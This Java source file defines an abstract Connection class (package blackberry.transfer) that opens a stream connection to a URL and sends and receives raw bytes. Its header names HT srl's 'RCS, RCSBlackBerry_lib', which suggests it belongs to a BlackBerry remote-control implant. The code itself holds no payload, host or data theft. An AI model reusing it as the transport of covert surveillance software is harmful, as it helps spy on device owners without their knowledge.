/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : Connection.java 
 * Created      : 26-mar-2010
 * *************************************************/

package blackberry.transfer;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;

import javax.microedition.io.Connector;
import javax.microedition.io.StreamConnection;

import blackberry.utils.Check;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;

public abstract class Connection {
    //#debug
    protected static Debug debug = new Debug("Connection", DebugLevel.VERBOSE);

    protected DataInputStream in;
    protected DataOutputStream out;
    protected StreamConnection connection;

    protected boolean connected;

    protected String url;

    //public abstract boolean connect();

    public final synchronized boolean connect() {

        // #ifdef DBC
        Check.ensures(url != null, "url null");
        // #endif

        try {
            //#debug
            debug.trace("url: " + url);
            connection = (StreamConnection) Connector.open(url);
            in = connection.openDataInputStream();
            out = connection.openDataOutputStream();

            if (in != null && out != null) {
                connected = true;
                // #ifdef DBC
                Check.ensures(connection != null, "connection_ null");
                Check.ensures(in != null, "in_ null");
                Check.ensures(out != null, "out_ null");
                // #endif
            }

        } catch (final IOException e) {
            //#debug
            debug.error("cannot connect: " + e);
            connected = false;
        }

        //#debug
        debug.trace("cannot connected: " + connected);
        return connected;
    }

    public synchronized void disconnect() {
        if (connected) {
            connected = false;
            if (in != null) {
                try {
                    in.close();
                } catch (final IOException e) {
                    // #debug
                    debug.error(e.toString());
                }
            }

            if (out != null) {
                try {
                    out.close();
                } catch (final IOException e) {
                    // #debug
                    debug.error(e.toString());
                }
            }

            if (connection != null) {
                try {
                    connection.close();
                } catch (final IOException e) {
                    // #debug
                    debug.error(e.toString());
                }
            }
        }

        in = null;
        out = null;
        connection = null;
    }

    protected abstract void error(String string);

    public abstract boolean isActive();

    public synchronized byte[] receive(final int length) throws IOException {
        if (connected) {
            // #ifdef DBC
            Check.requires(in != null, "null in_");
            // #endif

            // Create an input array just big enough to hold the data
            // (we're expecting the same string back that we send).
            final byte[] buffer = new byte[length];
            in.readFully(buffer);

            // Hand the data to the parent class for updating the GUI. By
            // explicitly
            return buffer;
        } else {
            error("Not connected. Active: " + isActive());
            return null;
        }
    }

    /**
     * Pass some data to the server and wait for a response.
     * 
     * @param data
     * @return
     * @throws IOException
     */
    public synchronized boolean send(final byte[] data) throws IOException {

        if (connected) {
            // #ifdef DBC
            Check.requires(out != null, "null out_");
            // #endif

            final int length = data.length;
            out.write(data, 0, length);

            // #debug
            debug.trace("sent :" + length);
            return true;
        } else {
            error("Not connected. Active: " + isActive());
            return false;
        }
    }

    protected abstract void trace(String string);

}